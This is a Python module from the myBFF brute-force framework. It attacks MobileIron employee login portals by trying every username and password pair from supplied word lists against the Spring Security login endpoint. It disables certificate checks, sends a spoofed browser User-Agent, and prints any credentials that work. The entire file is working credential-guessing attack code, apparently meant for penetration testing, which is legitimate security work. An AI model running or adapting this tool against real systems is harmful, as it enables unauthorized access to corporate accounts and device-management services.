#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser

class MobileIronBrute(webModule):
    def __init__(self, config, display, lock):
        super(MobileIronBrute, self).__init__(config, display, lock)
        self.fingerprint="MobileIron"
        self.response="Success"
    def somethingCool(self, config):
        print("[-] Not yet implemented...")
    def connectTest(self, config, payload):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            resp1 = c.get(config["HOST"] + '/employee/login.jsp', verify=False)
            cookie1 = resp1.cookies['JSESSIONID']
            cookies = dict(JSESSIONID=cookie1)
            c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': 'http://' + config["HOST"] + '/employee/login.jsp', 'Accept-Language': 'en-US,en;q=0.5'})
            c.cookies.clear()
            cpost = c.post(config["HOST"] + '/employee/j_spring_security_check', cookies=cookies, data=payload, allow_redirects=True, verify=False)
            m = re.search('You are unauthorized to access this page.', cpost.text)
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                if not config["dry_run"]:
                    print("[!] Time to do something cool!")
                    self.somethingCool(config)
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def payload(self, config):
        if config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
            for pass_line in pass_lines:
                if config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                    for line in lines:
                        config["USERNAME"] = line.strip('\n')
                        config["PASSWORD"] = pass_line.strip('\n')
                        payload = {
                            'j_username': config["USERNAME"],
                            'j_password': config["PASSWORD"]
                            }
                        self.connectTest(config, payload)
                else:
                    config["PASSWORD"] = pass_line.strip('\n')
                    payload = {
                        'j_username': config["USERNAME"],
                        'j_password': config["PASSWORD"]
                        }
                    self.connectTest(config, payload)
        elif config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'j_username': config["USERNAME"],
                    'j_password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'j_username': config["USERNAME"],
                'j_password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
